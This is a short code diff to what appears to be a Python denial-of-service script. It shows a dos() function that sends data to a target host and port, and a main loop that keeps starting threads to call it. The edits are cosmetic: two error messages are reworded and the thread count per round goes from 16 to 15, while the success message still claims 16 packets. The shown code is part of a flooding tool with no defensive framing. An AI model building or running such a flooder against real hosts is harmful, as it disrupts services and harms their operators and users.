@@ -63,7 +63,7 @@ def dos(host,port,num):
                 if sock.sendall(query)==None:
                     sock.close()
                 else:
-                    print("["+str(num)+"/"+str(num)+"] #### Error while sending! to: "+str(host))
+                    print("["+str(num)+"/"+str(num)+"] #### Error while sending to: "+str(host))
                     os._exit(0)
  
 if __name__ == "__main__":
@@ -89,7 +89,7 @@ if __name__ == "__main__":
         print("\n")
         try:
             while True:
-                for x in range(16):
+                for x in range(15):
                     ak = ak +1
                     th=threading.Thread(target=dos,args=(host,port,ak),name="User-"+str(1))
                     th.Deamon=True
@@ -97,5 +97,5 @@ if __name__ == "__main__":
                     th.join()
                 print("\tSuccesfully sent 16 packets")
         except KeyboardInterrupt:
-                print("\n\t[-] You're pressed Ctrl+C\n")
+                print("\n\t[-] You've pressed Ctrl+C\n")
                 os._exit(0)
